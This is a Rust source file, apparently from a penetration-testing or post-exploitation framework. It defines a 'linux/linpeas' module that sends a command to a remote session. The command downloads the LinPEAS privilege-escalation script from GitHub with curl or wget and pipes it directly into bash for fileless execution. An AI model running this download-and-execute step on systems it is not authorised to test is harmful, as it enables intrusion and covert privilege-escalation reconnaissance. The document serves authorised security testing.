use crate::core::modules::Module;
use crate::core::loghandler::LogHandler;
use crate::cli::output::send_command_and_print_output_until_marker;

pub struct LinpeasLinux;

impl Module for LinpeasLinux {
    fn name(&self) -> &'static str { "linux/linpeas" }
    fn description(&self) -> &'static str { "Run LinPEAS from memory (fileless, via curl or wget)" }
    fn usage(&self) -> &'static str { "Usage: run-module linux/linpeas <session_id>" }
    fn platform(&self) -> &'static str { "linux" }
    fn category(&self) -> &'static str { "privesc" }
    fn run(&self, session_id: usize, session_manager: &crate::core::session::SessionManager, _args: Vec<String>) {
        if let Some(session) = session_manager.get(session_id) {
            let marker = "__AEGIS_END__";
            // Try curl, fallback to wget
            let cmd = format!(
                "(curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh || wget -qO- https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) | bash; echo {}\n",
                marker
            );
            if let Err(e) = send_command_and_print_output_until_marker(&session, &cmd, marker) {
                LogHandler::error(&format!("Failed to run linPEAS: {}", e));
            } else {
                LogHandler::success("LinPEAS completed.");
            }
        }
    }
}